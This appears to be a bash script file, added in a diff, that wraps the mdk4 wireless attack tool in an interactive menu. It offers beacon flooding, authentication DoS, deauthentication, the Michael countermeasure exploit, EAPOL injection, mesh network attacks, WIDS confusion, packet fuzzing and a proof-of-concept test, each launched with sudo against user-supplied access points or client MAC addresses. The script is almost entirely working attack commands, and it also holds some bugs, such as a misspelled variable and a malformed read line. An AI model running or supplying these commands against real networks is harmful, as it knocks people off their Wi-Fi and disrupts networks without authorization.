@@ -1,0 +1,1136 @@
+#!/bin/bash
+red='\033[0;31m'
+green='\033[0;32m'
+boldgreen='\033[1;32m'
+boldred='\033[1;31m'
+nocolor='\033[0m'
+show_menu(){
+	while true; do
+		clear
+		echo -e "${red}---------------------${nocolor}"
+		echo -e "${red}-MDK4-Automated-V1.4-${nocolor}"
+		echo -e "${red}---Made-by-Glitch----${nocolor}"
+		echo -e "${red}---------------------${nocolor}"
+		echo
+		echo
+		echo "====================="
+		echo -e "${boldred}[a] Enable Monitor Mode${nocolor}"
+		echo -e "${boldred}[b] Disable Monitor Mode${nocolor}"
+		echo "====================="
+		echo -e "${boldgreen}[1] Beacon Flooding${nocolor}"
+		echo -e "${boldgreen}[2] Auth DOS${nocolor}"
+		echo -e "${boldgreen}[3] SSID Probe and Bruteforce${nocolor}"
+		echo -e "${boldgreen}[4] Deauth and Disassociate${nocolor}"
+		echo -e "${boldgreen}[5] Michael Countermeasure Exploit${nocolor}"
+		echo -e "${boldgreen}[6] EAPOL Start and Logoff Packet injection${nocolor}"
+		echo -e "${boldgreen}[7] Attacks for IEEE mesh networks${nocolor}"
+		echo -e "${boldgreen}[8] WIDS Confusion${nocolor}"
+		echo -e "${boldgreen}[9] Packet Fuzzer${nocolor}"
+		echo -e "${boldgreen}[10] POC vulnerabity test${nocolor}"
+		echo "====================="
+		echo
+		read -p "Option: " opt
+		case $opt in
+			a)
+				read -p "Interface: " int
+				sudo airmon-ng start $int
+
+
+				echo
+				read -p "Press Enter to continue." temp
+				show_menu
+				;;
+			b)
+				read -p "Interface: " int
+				sudo airmon-ng stop $int
+
+
+				echo
+				read -p "Press Enter to continue." temp
+				show_menu
+				;;
+			1)
+				clear
+				echo "----------------------------"
+				echo "--Beacon-Flooding-Selected--"
+				echo "----------------------------"
+				sleep 1
+				read -p "path[1] or just one ssid[2]? " prsb
+				read -p "Type Path to SSIDs or Type SSID: " bfssid
+				read -p "Would you like to use a valid accesspoint mac address? [Y/N] " acpoi
+				read -p "Interface: " int
+				case $prsb in
+					1)
+						pathorssidb=f
+						;;
+					2)
+						pathorssidb=n
+						;;
+					esac
+				case $acpoi in
+					[Yy])
+						accesspoint="m -$pathorssidb"
+						;;
+					[Nn])
+						accesspoint=$pathorssidb
+						;;
+					esac
+				sudo mdk4 $int b -$accesspoint $bfssid
+
+
+				echo
+				read -p "Press Enter to continue." temp
+				show_menu
+				;;
+			2)
+				clear
+				echo "-------------------------------"
+				echo "--Authentication-DOS-Selected--"
+				echo "-------------------------------"
+				sleep 1
+				read -p "AP Mac: " macaudos
+				read -p "Would you like to preform a intelligence test on the AP? [Y/N] " inap
+				read -p "Interface: " int
+				case $inap in
+					[Yy])
+						inteltest=-i
+						;;
+					[Nn])
+						inteltest=-a
+						;;
+					esac
+				sudo mdk4 $int a $inteltest $macaudos
+
+
+
+				echo
+				read -p "Press Enter to continue." temp
+				show_menu
+				;;
+			3)
+				clear
+				echo "----------------------------------"
+				echo "--SSID-Probe-Bruteforce-Selected--"
+				echo "----------------------------------"
+				sleep 1
+				read -p "Do you want to use SSID[S] or BSSID[B]: " sobpb
+				case $sobpb in
+					[Ss])
+						read -p "path[1] or just one ssid[2]? " prsp
+						read -p "Type Path to SSIDs or Type SSID: " pssid
+						;;
+					[Bb])
+						read -p "BSSID: " bssidpb
+						;;
+					esac
+				case $prsp in
+					1)
+						pathorssidp=f
+						;;
+					2)
+						pathorssidp=e
+						;;
+					esac
+				read -p "Interface: " int
+				case $sobpb in
+					[Ss])
+						sudo mdk4 $int p -$pathorssidp $pssid
+						
+						
+						echo
+						read -p "Press Enter to continue." temp
+						show_menu
+						;;
+					[Bb])
+						sudo mdk4 $int p -t $bssidpb
+
+
+						echo
+						read -p "Press Enter to continue." temp
+						show_menu
+						;;
+					esac
+				;;
+			4)
+				clear
+				echo "--------------------------------------"
+				echo "--Deauth-and-Disassociation-Selected--"
+				echo "--------------------------------------"
+				sleep 1
+				read -p "ESSID[1] or BSSID[2]? " eobdad
+				read -p "Type the ESSID or BSSID: " ebssidde
+				read -p "Do you want to Specify a mac address to attack? [Y/N] " specmac
+				case $specmac in
+					[Yy])
+						read -p "MAC Address to attack: " macaddrdad
+						read -p "Interface: " int
+						case $eobdad in
+							1)
+								essidy=E
+								;;
+							2)
+								essidy=B
+								;;
+							esac
+						sudo mdk4 $int d -S $macaddrdad -$essidy $ebssidde
+
+
+						echo
+						read -p "Press Enter to continue." temp
+						show_menu
+						;;
+					[Nn])
+						read -p "Interface: " int
+						case $eobdad in
+							1)
+								essidy=E
+								;;
+							2)
+								essidy=B
+								;;
+							esac
+						sudo mdk4 $int d -$essidy $ebssidde
+
+
+						echo
+						read -p "Press Enter to continue." temp
+						show_menu
+						;;
+					esac
+				;;
+			5)
+				clear
+				echo "-------------------------------------------"
+				echo "--Michael-Countermeasure-Exploit-Selected--"
+				echo "-------------------------------------------"
+				sleep 1
+				read -p "BSSID: " bssidmce
+				read -p "Interface: " int
+				read -p "Use New exploit? [Y/N] " nexpmce
+				case $nexpmce in
+					[Yy])
+						sudo mdk4 $int m -t $bssidmce -j -w 5
+
+
+						echo
+						read -p "Press Enter to continue." temp
+						show_menu
+						;;
+					[Nn])
+						sudo mdk4 $int m -t $bssidmce -w 5
+
+
+						echo
+						read -p "Press Enter to continue." temp
+						show_menu
+						;;
+					esac
+				;;
+			6)
+				clear
+				echo "----------------------------------"
+				echo "--EAPOL-Packet-Injector-Selected--"
+				echo "----------------------------------"
+				sleep 1
+				read -p "BSSID: " bssidepi
+				read -p "Interface: " int
+				read -p "Use Logoff messages? [Y/N] " logoffepi
+				case $logoffepi in
+					[Yy])
+						sudo mdk4 $int e -t $bssidepi -l
+
+
+						echo
+						read -p "Press Enter to continue." temp
+						show_menu
+						;;
+					[Nn])
+						sudo mdk4 $int e -t $bssidepi
+
+
+						echo
+						read -p "Press Enter to continue." temp
+						show_menu
+						;;
+					esac
+				;;
+			7)
+				clear
+				echo "----------------------------"
+				echo "--IEEE-802.11-Mesh-Attacks--"
+				echo "----------------------------"
+				sleep 1
+				echo "============================"
+				echo "[1] Duplicate Flooding"
+				echo "[2] Neighbor Flooding"
+				echo "[3] Find Buffer Errors"
+				echo "[4] Random Overrider"
+				echo "[5] All of the above randomly"
+				echo "============================"
+				echo
+				read -p "Pick a mode: " meshmode
+				case $meshmode in
+					1)
+						read -p "Mesh ID: " meshid
+						read -p "Interface: " int
+						read -p "Blackhole? [Y/N] " blakholmesh
+						case $blakholmesh in
+							[Yy])
+								read -p "Path Request Flooding? [Y/N] " pathreqfloodmesh
+								case $pathreqfloodmesh in
+									[Yy])
+										read -p "Create Loops? [Y/N] " loopmesh
+										case $loopmesh in
+											[Yy])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 1 -n $meshid -b $impmeshpoin -p $impmeshpoin -l
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											[Nn])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 1 -n $meshid -b $impmeshpoin -p $impmeshpoin
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											esac
+										;;
+									[Nn])
+										read -p "Create Loops? [Y/N] " loopmesh
+										case $loopmesh in
+											[Yy])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 1 -n $meshid -b $impmeshpoin -l
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											[Nn])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 1 -n $meshid -b $impmeshpoin
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											esac
+										;;
+									esac
+								;;
+							[Nn])
+								read -p "Path Request Flooding? [Y/N] " pathreqfloodmesh
+								case $pathreqfloodmesh in
+									[Yy])
+										read -p "Create Loops? [Y/N] " loopmesh
+										case $loopmesh in
+											[Yy])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 1 -n $meshid -p $impmeshpoin -l
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											[Nn])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 1 -n $meshid -p $impmeshpoin
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											esac
+										;;
+									[Nn])
+										read -p "Create Loops? [Y/N] " loopmesh
+										case $loopmesh in
+											[Yy])
+												sudo mdk4 $int s -f 1 -n $meshid -l
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											[Nn])
+												sudo mdk4 $int s -f 1 -n $meshid
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											esac
+										;;
+									esac
+								;;
+							esac
+						;;
+					2)
+						read -p "Mesh ID: " meshid
+						read -p "Interface: " int
+						read -p "Blackhole? [Y/N] " blakholmesh
+						case $blakholmesh in
+							[Yy])
+								read -p "Path Request Flooding? [Y/N] " pathreqfloodmesh
+								case $pathreqfloodmesh in
+									[Yy])
+										read -p "Create Loops? [Y/N] " loopmesh
+										case $loopmesh in
+											[Yy])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 2 -n $meshid -b $impmeshpoin -p $impmeshpoin -l
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											[Nn])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 2 -n $meshid -b $impmeshpoin -p $impmeshpoin
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											esac
+										;;
+									[Nn])
+										read -p "Create Loops? [Y/N] " loopmesh
+										case $loopmesh in
+											[Yy])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 2 -n $meshid -b $impmeshpoin -l
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											[Nn])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 2 -n $meshid -b $impmeshpont
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											esac
+									esac
+								;;
+							[Nn])
+								read -p "Path Request Flooding? [Y/N] " pathreqfloodmesh
+								case $pathreqfloodmesh in
+									[Yy])
+										read -p "Create Loops? [Y/N] " loopmesh
+										case $loopmesh in
+											[Yy])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 2 -n $meshid -p $impmeshpoin -l
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											[Nn])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 2 -n $meshid -p $impmeshpoin
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											esac
+										;;
+									[Nn])
+										read -p "Create Loops? [Y/N] " loopmesh
+										case $loopmesh in
+											[Yy])
+												sudo mdk4 $int s -f 2 -n $meshid -l
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											[Nn])
+												sudo mdk4 $int s -f 2 -n $meshid
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											esac
+										;;
+									esac
+								;;
+							esac
+						;;
+					3)
+						read -p "Mesh ID: " meshid
+						read -p "Interface: " int
+						read -p "Blackhole? [Y/N] " blakholmesh
+						case $blakholmesh in
+							[Yy])
+								read -p "Path Request Flooding? [Y/N] " pathreqfloodmesh
+								case $pathreqfloodmesh in
+									[Yy])
+										read -p "Create Loops? [Y/N] " loopmesh
+										case $loopmesh in
+											[Yy])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 3 -n $meshid -b $impmeshpoin -p $impmeshpoin -l
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											[Nn])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 3 -n $meshid -b $impmeshpoin -p $impmeshpoin
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											esac
+										;;
+									[Nn])
+										read -p "Create Loops? [Y/N] " loopmesh
+										case $loopmesh in
+											[Yy])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 3 -n $meshid -b $impmeshpoin -l
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											[Nn])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 3 -n $meshid -b $impmeshpoin
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											esac
+										;;
+									esac
+								;;
+							[Nn])
+								read -p "Path Request Flooding? [Y/N] " pathreqfloodmesh
+								case $pathreqfloodmesh in
+									[Yy])
+										read -p "Create Loops? [Y/N] " loopmesh
+										case $loopmesh in
+											[Yy])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 3 -n $meshid -p $impmeshpoin -l
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											[Nn])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 3 -n $meshid -p $impmeshpoin
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											esac
+										;;
+									[Nn])
+										read -p "Create Loops? [Y/N] " loopmesh
+										case $loopmesh in
+											[Yy])
+												sudo mdk4 $int s -f 3 -n $meshid -l
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											[Nn])
+												sudo mdk4 $int s -f 3 -n $meshid
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											esac
+										;;
+									esac
+								;;
+							esac
+						;;
+					4)
+						read -p "Mesh ID: " meshid
+						read -p "Interface: " int
+						read -p "Blackhole? [Y/N] " blakholmesh
+						case $blakholmesh in
+							[Yy])
+								read -p "Path Request Flooding? [Y/N] " pathreqfloodmesh
+								case $pathreqfloodmesh in
+									[Yy])
+										read -p "Create Loops? [Y/N] " loopmesh
+										case $loopmesh in
+											[Yy])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 4 -n $meshid -b $impmeshpoin -p $impmeshpoin -l
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											[Nn])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 4 -n $meshid -b $impmeshpoin -p $impmeshpoin
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											esac
+										;;
+									[Nn])
+										read -p "Create Loops? [Y/N] " loopmesh
+										case $loopmesh in
+											[Yy])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 4 -n $meshid -b $impmeshpoin -l
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											[Nn])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 4 -n $meshid -b $impmeshpoin
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											esac
+										;;
+									esac
+								;;
+							[Nn])
+								read -p "Path Request Flooding? [Y/N] " pathreqfloodmesh
+								case $pathreqfloodmesh in
+									[Yy])
+										read -p "Create Loops? [Y/N] " loopmesh
+										case $loopmesh in
+											[Yy])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 4 -n $meshid -p $impmeshpoin -l
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											[Nn])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 4 -n $meshid -p $impmeshpoin
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											esac
+										;;
+									[Nn])
+										read -p "Create Loops? [Y/N] " loopmesh
+										case $loopmesh in
+											[Yy])
+												sudo mdk4 $int s -f 4 -n $meshid -l
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											[Nn])
+												sudo mdk4 $int s -f 4 -n $meshid
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											esac
+										;;
+									esac
+								;;
+							esac
+						;;
+					5)
+						read -p "Mesh ID: " meshid
+						read -p "Interface: " int
+						read -p "Blackhole? [Y/N] " blakholmesh
+						case $blakholmesh in
+							[Yy])
+								read -p "Path Request Flooding? [Y/N] " pathreqfloodmesh
+								case $pathreqfloodmesh in
+									[Yy])
+										read -p "Create Loops? [Y/N] " loopmesh
+										case $loopmesh in
+											[Yy])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 5 -n $meshid -b $impmeshpoin -p $impmeshpoin -l
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											[Nn])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 5 -n $meshid -b $impmeshpoin -p $impmeshpoin
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											esac
+										;;
+									[Nn])
+										read -p "Create Loops? [Y/N] " loopmesh
+										case $loopmesh in
+											[Yy])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 5 -n $meshid -b $impmeshpoin -l
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											[Nn])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 5 -n $meshid -b $impmeshpoin
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											esac
+										;;
+									esac
+								;;
+							[Nn])
+								read -p "Path Request Flooding? [Y/N] " pathreqfloodmesh
+								case $pathreqfloodmesh in
+									[Yy])
+										read -p "Create Loops? [Y/N] " loopmesh
+										case $loopmesh in
+											[Yy])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 5 -n $meshid -p $impmeshpoin -l
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											[Nn])
+												read -p "Impersonated Mesh point: " impmeshpoin
+												sudo mdk4 $int s -f 5 -n $meshid -p $impmeshpoin
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											esac
+										;;
+									[Nn])
+										read -[ "Create Loops? [Y/N] " loopmesh
+										case $loopmesh in
+											[Yy])
+												sudo mdk4 $int s -f 5 -n $meshid -l
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											[Nn])
+												sudo mdk4 $int s -f 5 -n $meshid
+
+
+												echo
+												read -p "Press Enter to continue." temp
+												show_menu
+												;;
+											esac
+										;;
+									esac
+								;;
+							esac
+						;;
+					*)
+						clear
+						echo "Not an Option. Try again."
+						sleep 2
+						show_menu
+						;;
+					esac
+				;;
+			8)
+				clear
+				echo "---------------------------"
+				echo "--WIDS-Confusion-Selected--"
+				echo "---------------------------"
+				sleep 1
+				read -p "SSID: " wcssid
+				read -p "Interface: " int
+				read -p "Use Zero_Chaos Exploit? [Y/N] " zcewc
+				case $zcewc in
+					[Yy])
+						sudo mdk4 $int w -e $wcssid -z
+
+
+						echo
+						read -p "Press Enter to continue." temp
+						show_menu
+						;;
+					[Nn])
+						sudo mdk4 $int w -e $wcssid
+
+
+						echo
+						read -p "Press Enter to continue." temp
+						show_menu
+						;;
+					esac
+				;;
+			9)
+				clear
+				read -p "Interface: " int
+				clear
+				echo "--------------------------"
+				echo "--Packet-Fuzzer-Selected--"
+				echo "--------------------------"
+				echo
+				echo "=============================="
+				echo "[1] Sniff Packets from air"
+				echo "[2] Create Valid beacon frames with random SSIDs and Properties"
+				echo "[3] Create CTS frames to broadcast (Also can be used to CTS DOS)"
+				echo "[4] Create broadcast probe requests"
+				echo "=============================="
+				echo
+				read -p "How many sources do you want to use? " amtsrcpf
+				case $amtsrcpf in
+					1)
+						read -p "Source: " src1a
+						case $src1a in
+							1)
+								src1b=a
+								;;
+							2)
+								src1b=b
+								;;
+							3)
+								src1b=c
+								;;
+							4)
+								src1b=p
+								;;
+							esac
+						srcspf="$src1b"
+						srcspf="${srcspf^^}"
+						;;
+					2)
+						read -p "Source 1: " src1a
+						read -p "Source 2: " src2a
+						case $src1a in
+							1)
+								src1b=a
+								;;
+							2)
+								src1b=b
+								;;
+							3)
+								src1b=c
+								;;
+							4)
+								src1b=p
+								;;
+							esac
+						case $src2a in
+							1)
+								src2b=a
+								;;
+							2)
+								src2b=b
+								;;
+							3)
+								src2b=c
+								;;
+							4)
+								src2b=p
+								;;
+							esac
+						srcspf="$src1b$src2b"
+						srcspf="${srcspf^^}"
+						;;
+					3)
+						read -p "Source 1: " src1a
+						read -p "Source 2: " src2a
+						read -p "Source 3: " src3a
+						case $src1a in
+							1)
+								src1b=a
+								;;
+							2)
+								src1b=b
+								;;
+							3)
+								src1b=c
+								;;
+							4)
+								src1b=p
+								;;
+							esac
+						case $src2a in
+							1)
+								src2b=a
+								;;
+							2)
+								src2b=b
+								;;
+							3)
+								src2b=c
+								;;
+							4)
+								src2b=p
+								;;
+							esac
+						case $src3a in
+							1)
+								src3b=a
+								;;
+							2)
+								src3b=b
+								;;
+							3)
+								src3b=c
+								;;
+							4)
+								src3b=p
+								;;
+							esac
+						srcspf="$src1b$src2b$src3b"
+						srcspf="${srcspf^^}"
+						;;
+					4)
+						read -p "Source 1: " src1a
+						read -p "Source 2: " src2a
+						read -p "Source 3: " src3a
+						read -p "Source 4: " src4a
+						case $src1a in
+							1)
+								src1b=a
+								;;
+							2)
+								src1b=b
+								;;
+							3)
+								src1b=c
+								;;
+							4)
+								src1b=p
+								;;
+							esac
+						case $src2a in
+							1)
+								src2b=a
+								;;
+							2)
+								src2b=b
+								;;
+							3)
+								src2b=c
+								;;
+							4)
+								src2b=p
+								;;
+							esac
+						case $src3a in
+							1)
+								src3b=a
+								;;
+							2)
+								src3b=b
+								;;
+							3)
+								src3b=c
+								;;
+							4)
+								src3b=p
+								;;
+							esac
+						case $src4a in
+							1)
+								src4b=a
+								;;
+							2)
+								src4b=b
+								;;
+							3)
+								src4b=c
+								;;
+							4)
+								src4b=p
+								;;
+							esac
+						srcspf="$src1b$src2b$src3b$src4b"
+						srcspf="${srcspf^^}"
+						;;
+					esac
+				clear
+				echo "=========================="
+				echo "[N] No Modifier"
+				echo "[B] Set Destination MAC Address to broadcast"
+				echo "[M] Set Source MAC Address to broadcast"
+				echo "[S] Shotgun: Randomly overwrites a couple of bytes"
+				echo "[T] Append random bytes"
+				echo "[C] Cut packets short"
+				echo "[D] Insert Random Values in durations and flags fields"
+				echo "=========================="
+				echo
+				read -p "How many Modifiers do you want to use? " amtmodpf
+				case $amtmodpf in
+					1)
+						read -p "Modifier: " mod1a
+						modspf="$mod1a"
+						modspf="${modspf^^}"
+						;;
+					2)
+						read -p "Modifier 1: " mod1a
+						read -p "Modifier 2: " mod2a
+						modspf="$mod1a$mod2a"
+						modspf="${modspf^^}"
+						;;
+					3)
+						read -p "Modifier 1: " mod1a
+						read -p "Modifier 2: " mod2a
+						read -p "Modifier 3: " mod3a
+						modspf="$mod1a$mod2a$mod3a"
+						modspf="${modspf^^}"
+						;;
+					4)
+						read -p "Modifier 1: " mod1a
+						read -p "Modifier 2: " mod2a
+						read -p "Modifier 3: " mod3a
+						read -p "Modifier 4: " mod4a
+						modspf="$mod1a$mod2a$mod3a$mod4a"
+						modspf="${modspf^^}"
+						;;
+					5)
+						read -p "Modifier 1: " mod1a
+						read -p "Modifier 2: " mod2a
+						read -p "Modifier 3: " mod3a
+						read -p "Modifier 4: " mod4a
+						read -p "Modifier 5: " mod5a
+						modspf="$mod1a$mod2a$mod3a$mod4a$mod5a"
+						modspf="${modspf^^}"
+						;;
+					6)
+						read -p "Modifier 1: " mod1a
+						read -p "Modifier 2: " mod2a
+						read -p "Modifier 3: " mod3a
+						read -p "Modifier 4: " mod4a
+						read -p "Modifier 5: " mod5a
+						read -p "Modifier 6: " mod6a
+						modspf="$mod1a$mod2a$mod3a$mod4a$mod5a$mod6a"
+						modspf="${modspf^^}"
+						;;
+					7)
+						read -p "Modifier 1: " mod1a
+						read -p "Modifier 2: " mod2a
+						read -p "Modifier 3: " mod3a
+						read -p "Modifier 4: " mod4a
+						read -p "Modifier 5: " mod5a
+						read -p "Modifier 6: " mod6a
+						read -p "Modifier 7: " mod7a
+						modspf="$mod1a$mod2a$mod3a$mod4a$mod5a$mod6a$mod7a"
+						modspf="${modspf^^}"
+						;;
+					esac
+				if [[ "$modspf" == *"B"* ]]; then
+					read -p "Destination MAC Address: " desmacaddrpf
+				fi
+				if [[ "$modspf" == *"M"* ]]; then
+					read -p "Source MAC Address: " srcmacaddrpf
+				fi
+				sudo mdk4 $int p -s $srcspf -m $modspf -p 350
+
+
+				echo
+				read -p "Press Enter to continue." temp
+				show_menu
+				;;
+			10)
+				clear
+				echo "---------------------------------"
+				echo "--POC-Vunerablity-Test-Selected--"
+				echo "---------------------------------"
+				echo
+				read -p "AP MAC: " apmacpoc
+				read -p "Source MAC: " srcmacpoc
+				read -p "Target MAC: " tarmacpoc
+				read -p "Interface: " int
+				sudo mdk4 $int x -B $apmacpoc -S $srcmacpoc -T $tarmacpoc
+
+
+				echo
+				read -p "Press Enter to continue." temp
+				show_menu
+				;;
+			*)
+				clear
+				echo "Not an Option."
+				sleep 1
+				show_menu
+				;;
+			esac
+		done
+}
+show_menu
